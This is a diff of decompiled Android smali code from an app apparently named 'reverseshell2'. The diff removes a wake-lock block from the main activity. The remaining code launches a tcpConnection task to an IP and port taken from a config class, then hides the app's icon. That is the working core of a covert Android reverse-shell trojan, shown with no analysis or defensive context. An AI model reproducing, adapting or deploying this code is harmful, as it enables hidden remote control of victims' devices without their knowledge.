@@ -47,7 +47,7 @@
 
 # virtual methods
 .method protected onCreate(Landroid/os/Bundle;)V
-    .locals 6
+    .locals 5
     .param p1, "savedInstanceState"    # Landroid/os/Bundle;
 
     .line 21
@@ -90,59 +90,33 @@
 
     invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
 
-    .line 26
-    const-string v1, "power"
-
-    invoke-virtual {p0, v1}, Lcom/example/reverseshell2/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;
-
-    move-result-object v1
-
-    check-cast v1, Landroid/os/PowerManager;
-
-    .line 27
-    .local v1, "pm":Landroid/os/PowerManager;
-    sget-object v2, Lcom/example/reverseshell2/MainActivity;->TAG:Ljava/lang/String;
-
-    const/4 v3, 0x6
-
-    invoke-virtual {v1, v3, v2}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;
-
-    move-result-object v2
-
-    iput-object v2, p0, Lcom/example/reverseshell2/MainActivity;->mWakeLock:Landroid/os/PowerManager$WakeLock;
-
-    .line 28
-    iget-object v2, p0, Lcom/example/reverseshell2/MainActivity;->mWakeLock:Landroid/os/PowerManager$WakeLock;
-
-    invoke-virtual {v2}, Landroid/os/PowerManager$WakeLock;->acquire()V
-
     .line 29
     invoke-virtual {p0}, Lcom/example/reverseshell2/MainActivity;->finish()V
 
     .line 30
-    new-instance v2, Lcom/example/reverseshell2/tcpConnection;
+    new-instance v1, Lcom/example/reverseshell2/tcpConnection;
 
-    iget-object v3, p0, Lcom/example/reverseshell2/MainActivity;->activity:Landroid/app/Activity;
+    iget-object v2, p0, Lcom/example/reverseshell2/MainActivity;->activity:Landroid/app/Activity;
 
-    iget-object v4, p0, Lcom/example/reverseshell2/MainActivity;->context:Landroid/content/Context;
+    iget-object v3, p0, Lcom/example/reverseshell2/MainActivity;->context:Landroid/content/Context;
 
-    invoke-direct {v2, v3, v4}, Lcom/example/reverseshell2/tcpConnection;-><init>(Landroid/app/Activity;Landroid/content/Context;)V
+    invoke-direct {v1, v2, v3}, Lcom/example/reverseshell2/tcpConnection;-><init>(Landroid/app/Activity;Landroid/content/Context;)V
 
-    const/4 v3, 0x2
+    const/4 v2, 0x2
 
-    new-array v3, v3, [Ljava/lang/String;
+    new-array v2, v2, [Ljava/lang/String;
 
-    sget-object v4, Lcom/example/reverseshell2/config;->IP:Ljava/lang/String;
+    sget-object v3, Lcom/example/reverseshell2/config;->IP:Ljava/lang/String;
 
-    aput-object v4, v3, v0
+    aput-object v3, v2, v0
 
-    sget-object v4, Lcom/example/reverseshell2/config;->port:Ljava/lang/String;
+    sget-object v3, Lcom/example/reverseshell2/config;->port:Ljava/lang/String;
 
-    const/4 v5, 0x1
+    const/4 v4, 0x1
 
-    aput-object v4, v3, v5
+    aput-object v3, v2, v4
 
-    invoke-virtual {v2, v3}, Lcom/example/reverseshell2/tcpConnection;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
+    invoke-virtual {v1, v2}, Lcom/example/reverseshell2/tcpConnection;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
 
     .line 31
     invoke-virtual {p0, v0, v0}, Lcom/example/reverseshell2/MainActivity;->overridePendingTransition(II)V
@@ -155,15 +129,15 @@
     .line 33
     new-instance v0, Lcom/example/reverseshell2/functions;
 
-    iget-object v2, p0, Lcom/example/reverseshell2/MainActivity;->activity:Landroid/app/Activity;
+    iget-object v1, p0, Lcom/example/reverseshell2/MainActivity;->activity:Landroid/app/Activity;
 
-    invoke-direct {v0, v2}, Lcom/example/reverseshell2/functions;-><init>(Landroid/app/Activity;)V
+    invoke-direct {v0, v1}, Lcom/example/reverseshell2/functions;-><init>(Landroid/app/Activity;)V
 
-    iget-object v2, p0, Lcom/example/reverseshell2/MainActivity;->context:Landroid/content/Context;
+    iget-object v1, p0, Lcom/example/reverseshell2/MainActivity;->context:Landroid/content/Context;
 
-    invoke-virtual {v0, v2}, Lcom/example/reverseshell2/functions;->hideAppIcon(Landroid/content/Context;)V
+    invoke-virtual {v0, v1}, Lcom/example/reverseshell2/functions;->hideAppIcon(Landroid/content/Context;)V
 
-    .line 36
+    .line 35
     :cond_0
     return-void
 .end method
